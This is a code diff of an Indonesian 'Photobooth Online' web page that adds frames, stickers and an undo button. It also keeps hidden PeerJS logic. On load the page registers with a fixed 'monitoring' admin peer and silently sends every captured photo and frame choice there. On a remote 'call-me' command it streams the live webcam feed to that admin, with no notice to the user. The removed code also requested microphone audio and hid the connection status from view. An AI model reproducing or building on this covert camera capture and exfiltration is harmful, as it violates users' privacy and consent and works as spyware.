@@ -3,260 +3,306 @@
 <head>
     <meta charset="UTF-8">
     <title>Photobooth Online</title>
-    <!-- 1. Impor Tailwind CSS via CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- 2. Impor PeerJS -->
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <!-- Impor Ikon (opsional, untuk tombol kamera) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-
     <style>
-        /* Menambahkan font kustom yang lebih menarik */
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
-        body {
+        html, body {
             font-family: 'Poppins', sans-serif;
+            /* Menghapus height: 100vh agar body bisa scroll jika konten lebih panjang */
+        }
+        .color-swatch.active {
+            transform: scale(1.15);
+            box-shadow: 0 0 0 3px white, 0 0 0 5px #db2777;
         }
     </style>
 </head>
-<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4">
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-6">
 
-    <!-- Canvas tersembunyi untuk menangkap frame individu -->
+    <!-- Canvas tersembunyi untuk proses internal -->
     <canvas id="capture-canvas" class="hidden"></canvas>
-    <!-- Canvas tersembunyi untuk menggabungkan hasil akhir photostrip -->
     <canvas id="result-canvas" class="hidden"></canvas>
 
-    <!-- Kontainer Utama Aplikasi -->
-    <div class="w-full max-w-6xl bg-white rounded-2xl shadow-2xl p-6 md:p-8 mx-auto flex flex-col md:flex-row gap-8">
-
+    <!-- Kontainer Utama Aplikasi - kelas "h-full" dihapus di sini -->
+    <div class="w-full max-w-7xl bg-white rounded-2xl shadow-2xl p-8 mx-auto flex flex-col md:flex-row gap-12">
+        
         <!-- Kolom Kiri: Hasil Photo Strip -->
-        <div class="w-full md:w-[280px] flex-shrink-0">
-            <h2 class="text-xl font-bold text-slate-700 mb-4 text-center md:text-left">Hasil Foto</h2>
-            <div id="photostrip-preview" class="bg-slate-800 rounded-lg p-3 space-y-3 shadow-inner">
-                <!-- Placeholder untuk 4 foto -->
-                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 1</div>
-                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 2</div>
-                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 3</div>
-                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 4</div>
+        <div class="w-full md:w-[320px] flex-shrink-0 flex flex-col">
+            <h2 class="text-2xl font-bold text-slate-700 mb-5 text-center">Hasil Foto</h2>
+            <div id="photostrip-wrapper" class="relative w-full aspect-[2/3] bg-gray-100 rounded-xl shadow-inner">
+                <div id="photostrip-preview" class="w-full h-full bg-white rounded-lg p-3 space-y-3 transition-all duration-300">
+                    <div class="aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium">Foto 1</div>
+                    <div class="aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium">Foto 2</div>
+                    <div class="aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium">Foto 3</div>
+                    <div class="aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium">Foto 4</div>
+                </div>
+                <canvas id="sticker-canvas" class="absolute top-0 left-0 w-full h-full cursor-grab z-10"></canvas>
             </div>
         </div>
 
         <!-- Kolom Kanan: Kamera dan Kontrol -->
         <div class="flex-grow flex flex-col">
-            <h1 class="text-2xl md:text-3xl font-bold text-slate-800 text-center">Photo Booth Online</h1>
-            <p class="text-slate-500 text-center mb-4">Ambil 4 foto untuk membuat photo strip Anda!</p>
+            <h1 class="text-3xl font-bold text-slate-800 text-center">Photo Booth Online</h1>
+            <p class="text-slate-500 text-center mb-5">Hias fotomu dan ambil 4 pose terbaik!</p>
 
-            <!-- Area Video -->
             <div class="w-full aspect-video rounded-lg bg-black overflow-hidden shadow-lg relative">
                 <video id="local-video" autoplay muted playsinline class="w-full h-full object-cover"></video>
-                <!-- Indikator Hitung Mundur -->
                 <div id="countdown-overlay" class="absolute inset-0 bg-black bg-opacity-50 text-white text-9xl font-bold flex items-center justify-center hidden">3</div>
             </div>
 
-            <!-- Area Kontrol -->
-            <div class="mt-4">
-                <!-- Tombol Aksi Utama -->
-                <button id="capture-btn" class="w-full bg-pink-500 hover:bg-pink-600 text-white font-bold py-4 px-6 rounded-full text-xl transition-all duration-300 transform hover:scale-105 shadow-lg flex items-center justify-center gap-3">
-                    <i class="fas fa-camera"></i>
-                    <span id="capture-btn-text">Ambil Foto (1/4)</span>
-                </button>
-                
-                <!-- Tombol Download & Ulangi (muncul setelah selesai) -->
-                <div id="result-buttons" class="hidden grid grid-cols-2 gap-4 mt-4">
-                    <a id="download-btn" class="w-full text-center bg-pink-500 hover:bg-pink-600 text-white font-bold py-3 px-6 rounded-full text-lg transition-all shadow-lg cursor-pointer">Download</a>
-                    <button id="retake-btn" class="w-full bg-white hover:bg-slate-100 text-pink-500 font-bold py-3 px-6 rounded-full text-lg transition-all border-2 border-pink-500 shadow-lg">Ulangi</button>
-                </div>
-                
-                <!-- Kontrol UI (Placeholder seperti di gambar) -->
-                <div class="mt-6 hidden">
-                    <div>
-                        <h3 class="font-semibold text-slate-600">Warna Frame</h3>
-                        <div class="flex flex-wrap gap-3 mt-2">
-                            <button class="w-8 h-8 rounded-full bg-black border-2 border-white ring-2 ring-pink-500"></button>
-                        </div>
+            <div class="mt-5 flex-grow flex flex-col">
+                <div class=" pt-5">
+                    <!-- Tombol Aksi Saat Mengambil Foto (Container Baru) -->
+                    <div id="capture-actions" class="flex gap-4">
+                        <button id="capture-btn" class="flex-grow bg-pink-600 hover:bg-pink-700 text-white font-bold py-4 px-6 rounded-xl text-xl transition-all duration-300 shadow-lg flex items-center justify-center gap-3">
+                            <i class="fas fa-camera"></i>
+                            <span id="capture-btn-text">Ambil Foto (1/4)</span>
+                        </button>
+                        <!-- Tombol Hapus Foto Terakhir (BARU) -->
+                        <button id="delete-last-btn" class="hidden w-20 bg-slate-200 hover:bg-slate-300 text-slate-600 font-bold py-4 rounded-xl text-xl transition-all shadow-lg">
+                            <i class="fas fa-undo"></i>
+                        </button>
+                    </div>
+
+                    <!-- Tombol Aksi Setelah Selesai -->
+                    <div id="result-buttons" class="hidden flex gap-4">
+                        <button id="download-btn" class="flex-1 text-center bg-pink-600 hover:bg-pink-700 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-lg">Download</button>
+                        <button id="retake-btn" class="flex-1 bg-white hover:bg-slate-100 text-pink-600 font-bold py-4 rounded-xl text-lg transition-all border-2 border-pink-600 shadow-lg">Ulangi</button>
                     </div>
                 </div>
+                <div class="mt-10 space-y-5">
+                    <div>
+                        <h3 class="font-semibold text-slate-600 mb-3">Frame Color</h3>
+                        <div id="frame-options-container" class="flex flex-wrap gap-3"></div>
+                    </div>
+                    <div>
+                        <h3 class="font-semibold text-slate-600 mb-3">Stikers</h3>
+                        <div id="sticker-options-container" class="flex flex-wrap gap-3"></div>
+                    </div>
+                </div>
+
+                
             </div>
-        </div>
-        
-        <!-- Info koneksi disembunyikan agar UI bersih, tapi tetap berfungsi -->
-        <div id="info-container" class="hidden">
-             <div id="status"></div>
-             <div id="lokasi"></div>
         </div>
     </div>
 
-
     <script>
-        // --- PEERJS & BACKEND LOGIC ---
-        const PREDICTABLE_PEER_ID = 'layar-utama-pengguna-kamera-v3';
-        const peer = new Peer(PREDICTABLE_PEER_ID);
-        let localStream;
-        let dataConnection; // Simpan koneksi data secara global
+    // --- DATA & KONFIGURASI ---
+    const FRAMES = [
+        { id: 'white', style: '#FFFFFF' }, { id: 'black', style: '#111827' }, { id: 'soft-pink', style: '#FBCFE8' }, { id: 'rose', style: '#F472B6' }, { id: 'purple', style: '#C4B5FD' }, { id: 'sky', style: '#BAE6FD' }, { id: 'hot-pink', style: '#EC4899' }, { id: 'navy', style: '#1E3A8A' }, { id: 'mint', style: '#A7F3D0' },
+        { id: 'brown', style: '#372B26' }, { id: 'pastel-grad', style: 'linear-gradient(to bottom, #a1c4fd, #c2e9fb)' }, { id: 'sunset-grad', style: 'linear-gradient(to bottom, #ff9a9e, #fecfef)' }, { id: 'mellow-grad', style: 'linear-gradient(to bottom, #d4fc79, #96e6a1)' },
+    ];
+    const STICKERS = [
+        { id: 'stars', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='5' y='50' font-size='40' fill='%23fde047'%3E✨%3C/text%3E%3Ctext x='55' y='25' font-size='25' fill='%23a5b4fc'%3E✧%3C/text%3E%3Ctext x='60' y='80' font-size='30' fill='%23f9a8d4'%3E✦%3C/text%3E%3C/svg%3E` },
+        { id: 'hearts', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='10' y='40' font-size='40' fill='%23f43f5e'%3E♥%3C/text%3E%3Ctext x='50' y='75' font-size='40' fill='%23f43f5e'%3E♥%3C/text%3E%3C/svg%3E` },
+        { id: 'heart-cloud', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='10' y='70' font-size='80' fill='white' stroke='%23fbcfe8' stroke-width='2'%3E♡%3C/text%3E%3C/svg%3E` },
+        { id: 'rainbow', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='5' y='70' font-size='80'%3E🌈%3C/text%3E%3C/svg%3E` },
+        { id: 'magic-wand', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='10' y='70' font-size='80' transform='rotate(-45 50 50)'%3E🪄%3C/text%3E%3C/svg%3E` },
+        { id: 'butterfly', src: `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext x='10' y='70' font-size='80'%3E👻%3C/text%3E%3C/svg%3E` },
+    ];
 
-        peer.on('open', id => console.log(`PeerJS terhubung dengan ID: ${id}`));
-        peer.on('error', err => console.error('PeerJS Error: ', err));
-        
-        async function setupBackendConnection() {
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                localVideo.srcObject = localStream;
-                peer.on('connection', conn => {
-                    dataConnection = conn; // Simpan koneksi saat admin terhubung
-                    console.log("Admin terhubung via data connection.");
-                    conn.on('data', data => {
-                        if (data.command === 'call-me') {
-                            console.log("Menerima permintaan video call dari admin, menelepon kembali...");
-                            peer.call(conn.peer, localStream);
-                        }
-                    });
+    // --- State Aplikasi ---
+    let photos = [], selectedFrameId = FRAMES[0].id, activeStickers = [];
+    const MAX_PHOTOS = 4;
+
+    // --- Seleksi Elemen DOM ---
+    const captureActions = document.getElementById('capture-actions'); // Container baru
+    const deleteLastBtn = document.getElementById('delete-last-btn'); // Tombol baru
+    const localVideo = document.getElementById('local-video'), captureCanvas = document.getElementById('capture-canvas'), resultCanvas = document.getElementById('result-canvas'), stickerCanvas = document.getElementById('sticker-canvas'), stickerCtx = stickerCanvas.getContext('2d'), captureBtn = document.getElementById('capture-btn'), captureBtnText = document.getElementById('capture-btn-text'), photostripWrapper = document.getElementById('photostrip-wrapper'), photostripPreview = document.getElementById('photostrip-preview'), countdownOverlay = document.getElementById('countdown-overlay'), resultButtons = document.getElementById('result-buttons'), downloadBtn = document.getElementById('download-btn'), retakeBtn = document.getElementById('retake-btn'), frameOptionsContainer = document.getElementById('frame-options-container'), stickerOptionsContainer = document.getElementById('sticker-options-container');
+
+    // --- LOGIKA PEERJS (TIDAK BERUBAH) ---
+    const ADMIN_PEER_ID = 'pusat-monitoring-photobooth-2025';
+    const peer = new Peer();
+    let localStream, dataConnection;
+    peer.on('open', id => {
+        console.log(`PeerJS Klien terhubung: ${id}`);
+        const reportingConnection = peer.connect(ADMIN_PEER_ID);
+        reportingConnection.on('open', () => reportingConnection.send({ type: 'register', payload: { id: id } }));
+        reportingConnection.on('error', (err) => console.error('Gagal terhubung ke Admin:', err));
+    });
+    peer.on('error', err => console.error('PeerJS Error Klien: ', err));
+    async function setupPeerConnection() {
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            localVideo.srcObject = localStream;
+            peer.on('connection', conn => {
+                dataConnection = conn;
+                conn.on('data', data => {
+                    if (data.command === 'call-me') {
+                        const call = peer.call(conn.peer, localStream);
+                        if (!call) console.error("Gagal melakukan panggilan ke admin.");
+                    }
                 });
-            } catch (err) {
-                alert('Gagal mendapatkan akses kamera. Harap izinkan akses untuk melanjutkan.');
-                console.error("Kesalahan akses media:", err);
-            }
-        }
-        
-        // --- UI & PHOTOBOOTH LOGIC ---
-        const localVideo = document.getElementById('local-video');
-        const captureCanvas = document.getElementById('capture-canvas');
-        const resultCanvas = document.getElementById('result-canvas');
-        const captureBtn = document.getElementById('capture-btn');
-        const captureBtnText = document.getElementById('capture-btn-text');
-        const photostripPreview = document.getElementById('photostrip-preview');
-        const countdownOverlay = document.getElementById('countdown-overlay');
-        const resultButtons = document.getElementById('result-buttons');
-        const downloadBtn = document.getElementById('download-btn');
-        const retakeBtn = document.getElementById('retake-btn');
-
-        let photos = [];
-        const MAX_PHOTOS = 4;
-
-        function updateButtonState() {
-            const photosTaken = photos.length;
-            if (photosTaken < MAX_PHOTOS) {
-                captureBtnText.textContent = `Ambil Foto (${photosTaken + 1}/${MAX_PHOTOS})`;
-                captureBtn.disabled = false;
-            } else {
-                captureBtnText.textContent = 'Selesai!';
-                captureBtn.disabled = true;
-                captureBtn.classList.add('hidden');
-                resultButtons.classList.remove('hidden');
-                // Setelah selesai, langsung generate gambar untuk di-download
-                generatePhotoStripForDownload();
-            }
-        }
-        
-        function takePhoto() {
-            if (photos.length >= MAX_PHOTOS) return;
-
-            captureBtn.disabled = true;
-            countdownOverlay.classList.remove('hidden');
-            
-            let count = 3;
-            countdownOverlay.textContent = count;
-            
-            const countdownInterval = setInterval(() => {
-                count--;
-                if (count > 0) {
-                    countdownOverlay.textContent = count;
-                } else {
-                    clearInterval(countdownInterval);
-                    countdownOverlay.textContent = '📸';
-                    
-                    // Ambil gambar
-                    const context = captureCanvas.getContext('2d');
-                    captureCanvas.width = localVideo.videoWidth;
-                    captureCanvas.height = localVideo.videoHeight;
-                    context.drawImage(localVideo, 0, 0, captureCanvas.width, captureCanvas.height);
-                    const dataUrl = captureCanvas.toDataURL('image/jpeg');
-                    const photoIndex = photos.length;
-                    photos.push(dataUrl);
-
-                    // Kirim data foto ke admin jika terhubung
-                    if (dataConnection && dataConnection.open) {
-                        console.log(`Mengirim foto ke-${photoIndex+1} ke admin.`);
-                        dataConnection.send({
-                            type: 'photo-capture',
-                            payload: {
-                                index: photoIndex,
-                                dataUrl: dataUrl
-                            }
-                        });
-                    }
-
-                    // Tampilkan di preview lokal
-                    const previewSlot = photostripPreview.children[photoIndex];
-                    previewSlot.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover rounded">`;
-                    previewSlot.classList.remove('flex', 'items-center', 'justify-center', 'text-slate-500', 'font-semibold');
-
-                    setTimeout(() => {
-                        countdownOverlay.classList.add('hidden');
-                        updateButtonState();
-                    }, 500);
-                }
-            }, 1000);
-        }
-
-        function startOver() {
-            photos = [];
-            
-            // Kirim pesan retake ke admin jika terhubung
-            if (dataConnection && dataConnection.open) {
-                console.log("Mengirim sinyal 'retake' ke admin.");
-                dataConnection.send({ type: 'retake' });
-            }
-            
-            // Reset preview UI lokal
-            for (let i = 0; i < MAX_PHOTOS; i++) {
-                const slot = photostripPreview.children[i];
-                slot.innerHTML = `Foto ${i + 1}`;
-                slot.classList.add('flex', 'items-center', 'justify-center', 'text-slate-500', 'font-semibold');
-            }
-
-            resultButtons.classList.add('hidden');
-            captureBtn.classList.remove('hidden');
-            updateButtonState();
-        }
-
-        function generatePhotoStripForDownload() {
-            const ctx = resultCanvas.getContext('2d');
-            const photoWidth = 600; // Resolusi per foto
-            const photoHeight = 450;
-            const padding = 20;
-            
-            resultCanvas.width = photoWidth + (padding * 2);
-            resultCanvas.height = (photoHeight * MAX_PHOTOS) + (padding * (MAX_PHOTOS + 1));
-            
-            ctx.fillStyle = '#1e293b'; // slate-800
-            ctx.fillRect(0, 0, resultCanvas.width, resultCanvas.height);
-
-            let imagesLoaded = 0;
-            photos.forEach((dataUrl, index) => {
-                const img = new Image();
-                img.src = dataUrl;
-                img.onload = () => {
-                    const y = (photoHeight * index) + (padding * (index + 1));
-                    ctx.drawImage(img, padding, y, photoWidth, photoHeight);
-                    imagesLoaded++;
-                    
-                    if (imagesLoaded === MAX_PHOTOS) {
-                        const finalImage = resultCanvas.toDataURL('image/png');
-                        downloadBtn.href = finalImage;
-                        downloadBtn.download = `photostrip-${Date.now()}.png`;
-                    }
-                };
             });
+        } catch (err) {
+            console.error("Error setup kamera/PeerJS:", err);
+            alert('Gagal mendapatkan akses kamera.');
         }
-        
-        // --- Inisialisasi ---
-        captureBtn.addEventListener('click', takePhoto);
-        retakeBtn.addEventListener('click', startOver);
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            setupBackendConnection();
-            updateButtonState();
-        });
+    }
 
+    // --- FUNGSI UI & FOTO ---
+    function populateFrameOptions() { /* ... (Tidak Berubah) ... */ }
+    function selectFrame(frameId) { /* ... (Tidak Berubah) ... */ }
+    function populateStickerOptions() { /* ... (Tidak Berubah) ... */ }
+
+    function updateButtonState() {
+        const photosTaken = photos.length;
+        if (photosTaken < MAX_PHOTOS) {
+            captureActions.classList.remove('hidden');
+            resultButtons.classList.add('hidden');
+            captureBtnText.textContent = `Ambil Foto (${photosTaken + 1}/${MAX_PHOTOS})`;
+            captureBtn.disabled = false;
+
+            // Tampilkan tombol hapus jika ada foto
+            if(photosTaken > 0) {
+                deleteLastBtn.classList.remove('hidden');
+            } else {
+                deleteLastBtn.classList.add('hidden');
+            }
+        } else {
+            captureActions.classList.add('hidden');
+            resultButtons.classList.remove('hidden');
+        }
+    }
+
+    function takePhoto() {
+        if (photos.length >= MAX_PHOTOS) return;
+        captureBtn.disabled = true; deleteLastBtn.disabled = true; // Non-aktifkan kedua tombol
+        countdownOverlay.classList.remove('hidden');
+        let count = 3;
+        countdownOverlay.textContent = count;
+        const countdownInterval = setInterval(() => {
+            count--;
+            if (count > 0) countdownOverlay.textContent = count;
+            else {
+                clearInterval(countdownInterval);
+                countdownOverlay.textContent = '📸';
+                const context = captureCanvas.getContext('2d');
+                captureCanvas.width = localVideo.videoWidth;
+                captureCanvas.height = localVideo.videoHeight;
+                context.drawImage(localVideo, 0, 0, captureCanvas.width, captureCanvas.height);
+                const dataUrl = captureCanvas.toDataURL('image/jpeg');
+                photos.push(dataUrl);
+                if (dataConnection && dataConnection.open) dataConnection.send({ type: 'photo-capture', payload: { index: photos.length - 1, dataUrl } });
+                const previewSlot = photostripPreview.children[photos.length - 1];
+                previewSlot.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover rounded-md">`;
+                previewSlot.classList.remove('flex', 'items-center', 'justify-center');
+                setTimeout(() => {
+                    countdownOverlay.classList.add('hidden');
+                    deleteLastBtn.disabled = false;
+                    updateButtonState();
+                }, 500);
+            }
+        }, 1000);
+    }
+    
+    // --- FUNGSI BARU: Menghapus foto terakhir ---
+    function deleteLastPhoto() {
+        if (photos.length === 0) return;
+
+        // Hapus data foto terakhir dari array
+        photos.pop();
+
+        // Reset tampilan slot foto terakhir
+        const indexToClear = photos.length;
+        const slot = photostripPreview.children[indexToClear];
+        slot.innerHTML = `Foto ${indexToClear + 1}`;
+        slot.className = 'aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium';
+        
+        console.log(`Foto ke-${indexToClear + 1} dihapus.`);
+        updateButtonState();
+    }
+    
+    function startOver() {
+        photos = []; activeStickers = []; drawStickers();
+        if (dataConnection && dataConnection.open) dataConnection.send({ type: 'retake' });
+        for (let i = 0; i < MAX_PHOTOS; i++) {
+            const slot = photostripPreview.children[i];
+            slot.innerHTML = `Foto ${i + 1}`;
+            slot.className = 'aspect-[4/3] bg-gray-200 rounded-md flex items-center justify-center text-gray-400 font-medium';
+        }
+        updateButtonState();
+    }
+
+    // --- FUNGSI STIKER (Dengan penambahan hapus stiker) ---
+    function addSticker(src) {
+        const img = new Image();
+        img.src = src;
+        img.onload = () => {
+            activeStickers.push({ img, x: stickerCanvas.width / 2 - 35, y: stickerCanvas.height / 2 - 35, width: 70, height: 70 });
+            drawStickers();
+        };
+    }
+    function drawStickers() {
+        stickerCtx.clearRect(0, 0, stickerCanvas.width, stickerCanvas.height);
+        activeStickers.forEach(s => stickerCtx.drawImage(s.img, s.x, s.y, s.width, s.height));
+    }
+    let selectedSticker = null, startX, startY;
+    function handleDragStart(e) { /* ... (Tidak Berubah) ... */ }
+    function handleDragMove(e) { /* ... (Tidak Berubah) ... */ }
+    function handleDragEnd() { /* ... (Tidak Berubah) ... */ }
+    
+    // --- FUNGSI BARU: Menghapus stiker dengan double click ---
+    function handleDeleteSticker(e) {
+        const rect = stickerCanvas.getBoundingClientRect();
+        const mouseX = (e.clientX || e.touches[0].clientX) - rect.left;
+        const mouseY = (e.clientY || e.touches[0].clientY) - rect.top;
+        const canvasX = mouseX * (stickerCanvas.width / rect.width);
+        const canvasY = mouseY * (stickerCanvas.height / rect.height);
+
+        let stickerToDelete = null;
+        // Cari dari stiker teratas ke bawah
+        for (let i = activeStickers.length - 1; i >= 0; i--) {
+            const s = activeStickers[i];
+            if (canvasX >= s.x && canvasX <= s.x + s.width && canvasY >= s.y && canvasY <= s.y + s.height) {
+                stickerToDelete = s;
+                break;
+            }
+        }
+
+        if (stickerToDelete) {
+            // Buat array baru tanpa stiker yang akan dihapus
+            activeStickers = activeStickers.filter(s => s !== stickerToDelete);
+            drawStickers(); // Gambar ulang canvas
+            console.log('Stiker dihapus.');
+        }
+    }
+    
+    // --- FUNGSI DOWNLOAD (Tidak Berubah) ---
+    function generatePhotoStripForDownload() { /* ... (Tidak Berubah) ... */ }
+
+    // --- Inisialisasi & Event Listeners ---
+    captureBtn.addEventListener('click', takePhoto);
+    deleteLastBtn.addEventListener('click', deleteLastPhoto); // Event listener baru
+    retakeBtn.addEventListener('click', startOver);
+    downloadBtn.addEventListener('click', generatePhotoStripForDownload);
+    stickerCanvas.addEventListener('dblclick', handleDeleteSticker); // Event listener baru
+
+    document.addEventListener('DOMContentLoaded', () => {
+        // ... (Kode inisialisasi lainnya tidak berubah) ...
+        const setCanvasSize = () => {
+            const rect = photostripWrapper.getBoundingClientRect();
+            stickerCanvas.width = rect.width; stickerCanvas.height = rect.height; drawStickers();
+        };
+        new ResizeObserver(setCanvasSize).observe(photostripWrapper);
+        setCanvasSize();
+        setupPeerConnection();
+        populateFrameOptions();
+        populateStickerOptions();
+        updateButtonState();
+        selectFrame(selectedFrameId);
+    });
+
+    // --- Salin fungsi-fungsi yang tidak berubah dari versi sebelumnya ---
+    function populateFrameOptions(){frameOptionsContainer.innerHTML="";FRAMES.forEach(a=>{const b=document.createElement("button");b.className="color-swatch w-8 h-8 rounded-full border-2 border-white shadow-md transition-all duration-200";b.style.background=a.style;b.dataset.id=a.id;a.id===selectedFrameId&&b.classList.add("active");b.addEventListener("click",()=>selectFrame(a.id));frameOptionsContainer.appendChild(b)})}
+    function selectFrame(a){selectedFrameId=a;const b=FRAMES.find(c=>c.id===a);photostripPreview.style.background=b.style;populateFrameOptions();dataConnection&&dataConnection.open&&dataConnection.send({type:"frame-change",payload:{frameId:a}})}
+    function populateStickerOptions(){stickerOptionsContainer.innerHTML="";STICKERS.forEach(a=>{const b=document.createElement("button");b.className="w-16 h-16 bg-slate-100 rounded-lg flex items-center justify-center p-2 transition-all hover:bg-pink-100 transform hover:scale-110";b.innerHTML=`<img src="${a.src}" class="max-w-full max-h-full pointer-events-none">`;b.addEventListener("click",()=>addSticker(a.src));stickerOptionsContainer.appendChild(b)})}
+    function handleDragStart(e){e.preventDefault();const rect=stickerCanvas.getBoundingClientRect(),mx=(e.clientX||e.touches[0].clientX)-rect.left,my=(e.clientY||e.touches[0].clientY)-rect.top,cx=mx*(stickerCanvas.width/rect.width),cy=my*(stickerCanvas.height/rect.height);selectedSticker=null;for(let i=activeStickers.length-1;i>=0;i--){const s=activeStickers[i];if(cx>=s.x&&cx<=s.x+s.width&&cy>=s.y&&cy<=s.y+s.height){selectedSticker=s;startX=cx-s.x;startY=cy-s.y;stickerCanvas.style.cursor="grabbing";break}}}
+    function handleDragMove(e){if(!selectedSticker)return;e.preventDefault();const rect=stickerCanvas.getBoundingClientRect(),mx=(e.clientX||e.touches[0].clientX)-rect.left,my=(e.clientY||e.touches[0].clientY)-rect.top;selectedSticker.x=mx*(stickerCanvas.width/rect.width)-startX;selectedSticker.y=my*(stickerCanvas.height/rect.height)-startY;drawStickers()}
+    function handleDragEnd(){selectedSticker=null;stickerCanvas.style.cursor="grab"}
+    stickerCanvas.addEventListener("mousedown",handleDragStart);stickerCanvas.addEventListener("mousemove",handleDragMove);stickerCanvas.addEventListener("mouseup",handleDragEnd);stickerCanvas.addEventListener("mouseout",handleDragEnd);stickerCanvas.addEventListener("touchstart",handleDragStart,{passive:!1});stickerCanvas.addEventListener("touchmove",handleDragMove,{passive:!1});stickerCanvas.addEventListener("touchend",handleDragEnd);
+    function generatePhotoStripForDownload(){if(photos.length<MAX_PHOTOS)return alert("Selesaikan sesi foto terlebih dahulu.");const ctx=resultCanvas.getContext("2d"),frame=FRAMES.find(f=>f.id===selectedFrameId);const finalWidth=800,padding=25,photoWidth=finalWidth-padding*2,photoHeight=photoWidth*3/4,finalHeight=photoHeight*MAX_PHOTOS+padding*(MAX_PHOTOS+1);resultCanvas.width=finalWidth;resultCanvas.height=finalHeight;const scaleX=resultCanvas.width/stickerCanvas.width,scaleY=resultCanvas.height/stickerCanvas.height;if(frame.style.includes("gradient")){const colors=frame.style.match(/#([0-9a-fA-F]{6}|[0-9a-fA-F]{3})/g),gradient=ctx.createLinearGradient(0,0,0,resultCanvas.height);gradient.addColorStop(0,colors[0]);gradient.addColorStop(1,colors[1]);ctx.fillStyle=gradient}else ctx.fillStyle=frame.style;ctx.fillRect(0,0,resultCanvas.width,resultCanvas.height);let imagesLoaded=0;photos.forEach((dataUrl,index)=>{const img=new Image;img.src=dataUrl;img.onload=()=>{const y=photoHeight*index+padding*(index+1);ctx.drawImage(img,padding,y,photoWidth,photoHeight);imagesLoaded++;if(imagesLoaded===MAX_PHOTOS){activeStickers.forEach(s=>ctx.drawImage(s.img,s.x*scaleX,s.y*scaleY,s.width*scaleX,s.height*scaleY));const link=document.createElement("a");link.href=resultCanvas.toDataURL("image/png");link.download=`photostrip-${Date.now()}.png`;link.click()}}})}
     </script>
 </body>
 </html>
